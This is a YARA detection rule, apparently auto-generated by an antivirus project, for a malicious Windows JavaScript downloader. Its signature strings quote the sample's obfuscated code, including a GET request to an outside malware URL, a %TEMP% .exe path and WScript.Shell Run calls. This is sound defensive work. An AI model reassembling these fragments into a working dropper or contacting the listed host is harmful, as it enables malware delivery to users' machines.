rule sig_20160328_49a6f9967ab5813690c72c1f13109754 {
  meta:
    description = "datamaliciousorder - file 20160328_49a6f9967ab5813690c72c1f13109754.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d3acea25e364f75932c8f14c9f1e6c3570e969ffe11048c8b35f47b81438dcbc"

  strings:
    $s1  = "function Sioxk() {return Lqoxbxr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"tfMZ1pQSJL.exe\";};" fullword ascii
    $s2  = "Bxtrrjq[Fespqdhw](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Fzaug](Jxfvokazu() * 11)} while (Bxtrrjq[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Lqoxbxr = function Pdixubuqg() {return WScript[Ypjeuirxil](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Ymzut(Uoirue, Ekdhfuq){return Uoirue - Ekdhfuq;};" fullword ascii
    $s6  = "function Xrpefr(Ljhshdy){Lqoxbxr[\"Run\"](Ljhshdy, Ujsbq, Ujsbq);};" fullword ascii
    $s7  = "function Znlsctuam() {return ((Umgfgrbstl == true) && (Umgfgrbstl == Zcvaqwyhlc)) ? 1 : Ujsbq;};" fullword ascii
    $s8  = "function Xeweohc()" fullword ascii
    $s9  = "var Zcvaqwyhlc = false;" fullword ascii
    $s10 = "return Ymzut(Mejrvxzhy, Ddxbcvzvsd);" fullword ascii
    $s11 = "Umgfgrbstl = true; " fullword ascii
    $s12 = " while (Gdwvqovsdg){" fullword ascii
    $s13 = "Zcvaqwyhlc = true; " fullword ascii
    $s14 = "function Jxfvokazu(){return 22;};" fullword ascii
    $s15 = "function Uspenebr(){return Lgjyprlhs;};" fullword ascii
    $s16 = "function Tafbf(){return Ypjeuirxil;};" fullword ascii
    $s17 = "var Umgfgrbstl = false;" fullword ascii
    $s18 = "function Eghcr(Ldfwqh) {var Hzjvprp = (1, 2, 3, 4, 5, Ldfwqh); return Hzjvprp;};" fullword ascii
    $s19 = "var Pdctnes = new this[\"Date\"]();" fullword ascii
    $s20 = "var Fcbwhcxms = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}